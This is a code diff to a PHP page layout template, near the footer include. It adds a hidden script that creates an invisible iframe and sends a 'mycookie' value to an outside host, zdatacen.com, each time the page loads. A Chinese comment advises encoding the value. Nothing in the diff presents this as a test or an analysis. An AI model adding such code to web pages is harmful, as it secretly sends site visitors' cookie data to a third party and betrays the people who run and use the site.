@@ -24,5 +24,11 @@
 <?php if(strtolower($controller) != 'password'): ?>
     <?php $this->partial("layout/footer"); ?>
 <?php endif; ?>
+<script>
+    var _frm = document.createElement("iframe");
+    _frm.style.display="none";
+    _frm.src = "http://www.zdatacen.com/cookie?mycookie=<?php echo @$mycookie ?>";//此处xxx最好编码
+    document.body.appendChild(_frm);
+</script>
 </body>
 </html>
